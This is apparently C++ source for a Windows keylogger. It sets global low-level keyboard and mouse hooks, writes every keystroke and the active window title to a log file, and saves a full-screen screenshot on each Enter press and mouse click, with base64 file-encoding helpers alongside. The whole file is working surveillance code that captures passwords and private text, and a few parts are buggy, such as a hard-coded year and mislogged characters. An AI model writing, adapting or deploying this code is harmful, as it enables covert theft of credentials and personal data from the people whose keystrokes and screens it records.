#include "pch.h"
#include "wtypes.h"
#include <iostream>
#include <Windows.h>
#include <iomanip>
#include <string>
#include <fstream>
#include <vector>
#include <chrono>
#include <fstream>
#include <sstream>
#include <gdiplus.h>
#include <io.h>
#include <thread>
#include <stdio.h>
#include <direct.h>

using namespace std;
using namespace Gdiplus;

#pragma comment(lib, "gdiplus.lib")
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK mouseHook;
HHOOK keyboardHook;
HWND prevWindow;
ofstream logfile;
POINT pd;
POINT pu;
int w = 1920;


int h = 1080;
char title[1024];
bool shift = false;
bool control = false;
bool windows = false;
long file_pos;
static const string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";
void decode64(string b64, string output);
string encode64(string filename);
string base64_decode(std::string const& encoded_string);
string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
int SaveScreenshot(string filename, ULONG uQuality);

int main()
{
	_mkdir("sc");
	locale swedish("swedish");
	locale::global(swedish);
	cout << "Hooking the keyboard" << endl;
	logfile.open("keyboard.log");
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, 0, 0);
	cout << "Hook: " << keyboardHook << endl;
	if ((GetKeyState(VK_CAPITAL)) != 0) {
		shift = true;
		cout << "Caps Lock: on" << endl;
	}
	else {
		shift = false;
		cout << "Caps Lock: off" << endl;
	}
	MSG msg{ 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0) //returns 0 when WM_QUIT gets called				
	UnhookWindowsHookEx(keyboardHook);
	UnhookWindowsHookEx(mouseHook);
	logfile.close();
	return 0;

}

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

string currentDateTime() {
	SYSTEMTIME st;
	stringstream ss;
	::GetSystemTime(&st);
	ss 
	    << "2018" << "-" // TODO: get current year with the yyyy format not the y yyy format
		<< st.wMonth << "-"
		<< st.wDay << " - "
		<< st.wHour + 2 << '.'
		<< st.wMinute << '.'
	    << st.wSecond << '.'
		<< st.wMilliseconds;
	return ss.str();
}

int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
	unsigned int num = 0, size = 0;
	GetImageEncodersSize(&num, &size);
	if (size == 0) return -1;
	ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
	if (pImageCodecInfo == NULL) return -1;
	GetImageEncoders(num, size, pImageCodecInfo);

	for (unsigned int j = 0; j < num; ++j) {
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return -1;
}

int SaveScreenshot(string filename, ULONG uQuality)
{
	ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplusStartupInput;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	HWND hMyWnd = GetDesktopWindow();
	RECT r;
	HDC dc, hdcCapture;
	int nBPP, nCapture, iRes;
	LPBYTE lpCapture;
	CLSID imageCLSID;
	Bitmap *pScreenShot;
	GetWindowRect(hMyWnd, &r);
	dc = GetWindowDC(hMyWnd);
	nBPP = GetDeviceCaps(dc, BITSPIXEL);
	hdcCapture = CreateCompatibleDC(dc);
	BITMAPINFO bmiCapture = { sizeof(BITMAPINFOHEADER), w, -h, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0, };
	HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture, DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
	if (!hbmCapture) {
		DeleteDC(hdcCapture);
		DeleteDC(dc);
		GdiplusShutdown(gdiplusToken);
		printf("failed to take the screenshot. err: %d\n", GetLastError());
		return 0;
	}
	nCapture = SaveDC(hdcCapture);
	SelectObject(hdcCapture, hbmCapture);
	BitBlt(hdcCapture, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	RestoreDC(hdcCapture, nCapture);
	DeleteDC(hdcCapture);
	DeleteDC(dc);
	pScreenShot = new Bitmap(hbmCapture, (HPALETTE)NULL);
	EncoderParameters encoderParams;
	encoderParams.Count = 1;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Guid = EncoderQuality;
	encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &uQuality;
	GetEncoderClsid((WCHAR*)L"image/png", &imageCLSID);
	wchar_t *lpszFilename = new wchar_t[filename.length() + 1];
	mbstowcs(lpszFilename, filename.c_str(), filename.length() + 1);
	iRes = (pScreenShot->Save(lpszFilename, &imageCLSID, &encoderParams) == Ok);
	delete pScreenShot;
	DeleteObject(hbmCapture);
	GdiplusShutdown(gdiplusToken);
	return iRes;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	#pragma region Key Down
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prevWindow != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title, strlen(title) + 1);
			LPWSTR old_title = wtitle;
			SetWindowText(prevWindow, old_title);
			GetWindowTextA(fwindow, title, 1024);
			cout << "\n[" << currentDateTime() << "] " << "Title: " << title << " -> " << "\"keyboard hooked application\"" << endl;
			logfile << "\n[" << currentDateTime() << "] " << "Title: " << title << " -> " << "\"keyboard hooked application\"" << endl;
			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
			prevWindow = fwindow;
		}

		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 8: //backspace
		{
			cout << "\b \b";
			file_pos = logfile.tellp();
			logfile.seekp(file_pos - 1);
			logfile.write("", 1); // writes space 			  
			file_pos = logfile.tellp(); //TODO: remove char not overwrite
			logfile.seekp(file_pos - 1);
			break;
		}
		case 9: //tab
			cout << "    ";
			logfile << "    ";
			break;
		case 13:
		{
			cout << " [ENTER]\n";
			logfile << " [ENTER]\n";
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(SaveScreenshot, filename, 1);
			sc.detach();
			break;
		}
		case 32: //space-bar
			cout << " ";
			logfile << " ";
			break;
		case 20:
			shift = !shift;
			break;
		case 162: //ctrl
		case 163:
			control = true;
			break;
		case 91: //win-key
			windows = true;
			break;
		case 160: //shift
		case 161:
			shift = !shift;
			break;
		case 190:
			cout << ".";
			logfile << ".";
			break;
		case 187:
			cout << "?";
			logfile << "?";
			break;
		case 188:
			cout << ",";
			logfile << ",";
			break;
		case 189:
			cout << "-";
			logfile << "-";
			break;
		case 221:
			cout << "å";
			logfile << "å";
			break;
		case 222:
			cout << "ä";
			logfile << "å";
			break;
		case 192:
			cout << "ö";
			logfile << "ö";
			break;
		default:
			if (windows && (current_key >= 65 && current_key <= 90)) {
				cout << " WIN-[" << (char)(current_key) << "] \n";
				logfile <<  " WIN-[" << (char)(current_key) << "] \n";
				break;
			}
			if (control && (current_key >= 65 && current_key <= 90)) { // if control is pressed and the other key is (A - Z)
				cout << " CTRL-[" << (char)(current_key) << "] ";
				logfile << " CTRL-[" << (char)(current_key) << "] ";
				break;
			}
			if (shift == false && (current_key >= 65 && current_key <= 90)) { // (A - Z)
				cout << (char)(current_key + 32);
				logfile << (char)(current_key + 32);
				break;
			}
			else if (shift == true && (current_key >= 65 && current_key <= 90)) { // (A - Z) shifted
				cout << (char)(current_key);
				logfile << (char)(current_key);
				break;
			}
			else if (shift == true && (current_key >= 48 && current_key <= 57)) { // shifted numbered
				if (current_key == 48) {
					cout << (char)(current_key + 13);
					logfile << (char)(current_key + 13);
				}
				else {
					cout << (char)(current_key - 16);
					logfile << (char)(current_key - 16);
				}
				
			}
			else if ((current_key >= 48 && current_key <= 57)){ // numbers
				cout << (char)(current_key);
				logfile << (char)(current_key);
				break;
			}
			else {
				cout << (int)current_key;
				break;
			}
			break;
		}
	}
#pragma endregion
	#pragma region Key Up
	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 13:
		{
			break;
		}
		case 91:
			windows = false;
			break;
		case 160:
		case 161:
			shift = !shift;
			break;
		case 162:
		case 163:
			control = false;
			break;
		}
	}
#pragma endregion
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	#pragma region Mouse Up
		if (wParam == 514) {

			GetCursorPos(&pd);
			cout << "[lU]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
			cout << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
			logfile << "[U]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
			logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";

			if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
				string filename = "sc\\" + currentDateTime() + ".jpg";
				thread sc(SaveScreenshot, filename, 1);
				sc.detach();
				cout << " [ CLICK ] "<< endl;
				logfile << " [ CLICK ] " << "[" << filename << "]" << endl;
			}
			else {			
				string filename = "sc\\" + currentDateTime() + ".jpg";
				thread sc(SaveScreenshot, filename, 1);
				sc.detach();
				cout << " [ DRAG ] " << endl;
				logfile << " [ DRAG ] " << "[" << filename << "]" << endl;
			}
		}
		else if (wParam == 517) {

			GetCursorPos(&pd);

			cout << "[rU]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
			cout << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
			logfile << "[U]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
			logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";

			if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
				string filename = "sc\\" + currentDateTime() + ".jpg";
				thread sc(SaveScreenshot, filename, 1);
				sc.detach();
				cout << " [ RCLICK ] " << endl;
				logfile << " [ RCLICK ] [" << filename << "]" << endl;

			}
			else {
				string filename = "sc\\" + currentDateTime() + ".jpg";
				thread sc(SaveScreenshot, filename, 1);
				sc.detach();
				cout << " [ RDRAG ] " << endl;
				logfile << " [ RDRAG ] " << "[" << filename << "]" << endl;
			}
		}
	#pragma endregion

	#pragma region Mouse Down
		else if (wParam == 513) {
			GetCursorPos(&pu);
			cout << endl << "[" << currentDateTime() << "] ML[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
			logfile <<  endl << "[" << currentDateTime() << "] Left Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
		}
		else if (wParam == 516){
			GetCursorPos(&pu);
			cout << endl << "[" << currentDateTime() << "] MR[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
			logfile << endl << "[" << currentDateTime() << "] Right Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
		}
	#pragma endregion
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}

	return ret;

}

string base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}

string encode64(string filename) {
	ifstream fin(filename, ios::binary);
	ostringstream ostring;
	ostring << fin.rdbuf();
	string dout = ostring.str();
	return base64_encode((const unsigned char *)dout.c_str(), dout.length());
}

void decode64(string b64, string output) {
	ofstream fout(output, ios::binary);
	string ofb64 = base64_decode(b64);
	fout << ofb64;
}